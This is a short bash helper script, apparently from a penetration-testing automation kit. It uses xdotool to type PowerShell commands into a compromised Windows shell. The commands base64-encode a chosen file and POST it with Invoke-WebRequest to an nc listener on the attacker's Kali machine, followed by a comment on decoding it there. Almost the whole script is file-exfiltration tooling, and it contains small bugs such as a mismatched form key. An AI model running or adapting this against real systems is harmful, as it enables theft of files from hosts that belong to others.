#!/bin/bash

: '
ps: upload attacker file to nc as base64
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_FIELD=$(form_item  "file" "file")
HTTP_PORT_FIELD=$(form_item  "http port" "http_port")

# Generate GUI form
generate_form "${FILE_FIELD}" "${HTTP_PORT_FIELD}"

FILE=${form_data["file"]}
HTTP_PORT=${form_data["Http port"]}
BASE_FILE_NAME= $(basename $FILE)

paste_command "\$Base64String = [System.convert]::ToBase64String((Get-Content -Path '${FILE}' -Encoding Byte))"
xdotool key Return
sleep 2

paste_command "# Be sure nc -lvnp ${HTTP_PORT} is running"
xdotool key Return
sleep 3

paste_command "Invoke-WebRequest -Uri http://${KALI_IP}:${HTTP_PORT} -Method POST -Body $Base64String"
xdotool key Return
sleep 1

paste_command "# check the port listening terminal and execute the following to save the file"
xdotool key Return
sleep 1

paste_command "# echo <base64 encoded file> | base64 -d -w 0 > ${BASE_FILE_NAME}"
xdotool key Return
